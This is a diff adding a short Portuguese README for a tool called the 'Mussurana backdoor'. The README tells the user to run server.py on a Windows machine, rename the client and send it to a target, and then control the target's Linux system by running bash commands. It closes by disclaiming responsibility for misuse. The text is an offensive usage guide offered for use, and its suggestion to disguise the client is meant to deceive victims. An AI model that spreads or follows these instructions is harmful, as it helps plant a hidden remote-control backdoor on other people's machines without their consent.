@@ -1,0 +1,11 @@
+#####################################################
+# Mussurana backdoor by: O Renegado                 #
+#####################################################
+esse script foi escrito para funcionar no windows.
+seu uso é simples, vc executa o server.py em sua maquina
+com windows e manda o cliente para o alvo(claro que vc vai renomear né?)
+assim que abrir conexão vc terá controle ao sistema alvo(tem que ser linux)
+assim que obter acesso, vc podera executar comandos bash(ex: ls, cat, etc...)
+quando quiser sair digite bye para fechar conexão, ou
+aperte CTRL + C
+não me responsabilizo pelas merdas que fizerem!!!
